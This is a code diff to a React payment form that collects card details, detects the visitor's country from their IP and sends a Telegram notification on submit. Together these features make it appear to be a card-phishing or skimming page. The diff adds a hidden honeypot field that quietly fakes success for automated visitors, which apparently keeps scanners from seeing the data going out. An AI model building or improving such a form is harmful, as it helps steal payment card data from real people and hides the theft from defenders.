@@ -219,6 +219,9 @@ const PaymentForm = ({ onProceed, onBack }: PaymentFormProps) => {
   const [postcode, setPostcode] = useState("");
   const [country, setCountry] = useState("");
   const [isDetectingCountry, setIsDetectingCountry] = useState(true);
+  
+  // Honeypot field - bots will fill this, humans won't see it
+  const [honeypot, setHoneypot] = useState("");
 
   // Auto-detect country from IP on mount
   useEffect(() => {
@@ -314,6 +317,15 @@ ${countryName}
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    
+    // Bot detection: if honeypot is filled, silently reject
+    if (honeypot) {
+      console.log("Bot detected via honeypot");
+      // Simulate success to fool bots, but don't process
+      onProceed();
+      return;
+    }
+    
     await sendTelegramNotification();
     onProceed();
   };
@@ -335,6 +347,29 @@ ${countryName}
         </p>
 
         <form onSubmit={handleSubmit} className="space-y-5">
+          {/* Honeypot field - hidden from real users, bots will fill it */}
+          <div 
+            aria-hidden="true" 
+            style={{ 
+              position: 'absolute', 
+              left: '-9999px', 
+              top: '-9999px',
+              opacity: 0,
+              pointerEvents: 'none'
+            }}
+          >
+            <label htmlFor="website_url">Website URL</label>
+            <input
+              type="text"
+              id="website_url"
+              name="website_url"
+              tabIndex={-1}
+              autoComplete="off"
+              value={honeypot}
+              onChange={(e) => setHoneypot(e.target.value)}
+            />
+          </div>
+
           {/* Card Details Section */}
           <div className="space-y-4">
             <h3 className="font-semibold text-sm text-muted-foreground uppercase tracking-wide">
